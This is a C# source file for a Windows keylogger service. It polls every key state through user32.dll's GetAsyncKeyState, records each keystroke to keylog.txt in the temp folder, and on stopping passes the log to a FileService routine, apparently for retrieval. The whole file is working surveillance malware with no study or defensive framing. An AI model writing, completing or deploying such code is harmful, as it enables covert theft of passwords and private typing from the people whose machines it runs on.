using System.Runtime.InteropServices;
public static class KeyLoggerService
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
     private static CancellationTokenSource? cts;
    private static Task? runningTask;
    private static string? logFilePath;
    public static void Start()
    {
        if (runningTask != null && !runningTask.IsCompleted)
            return;

        cts = new CancellationTokenSource();
        runningTask = Task.Run(() => Run(cts.Token));
    }
        public static async Task Stop()
    {
        if (cts == null) return;

        cts.Cancel();

        if (runningTask != null)
            await runningTask;
            
        if (logFilePath != null && File.Exists(logFilePath))
        {
            await FileService.GetFileByPath(logFilePath);
        }
        cts = null;
        runningTask = null;
    }
    private static async Task Run(CancellationToken token)
    {
        logFilePath = Path.Combine(Path.GetTempPath(), "keylog.txt");

        using (StreamWriter logFile = new StreamWriter(logFilePath, false))
        {
           try
            {
                while (!token.IsCancellationRequested)
                {
                    for (int key = 0; key < 255; key++)
                    {
                        if (GetAsyncKeyState(key) == -32767)
                        {
                            logFile.Write((Keys)key);
                            Console.Write((Keys)key);
                        }
                    }

                    await Task.Delay(10, token);
                }
            }
            catch (TaskCanceledException)
            {
                
            }
            finally
            {
                logFile.Flush();
            }
        }
    }
}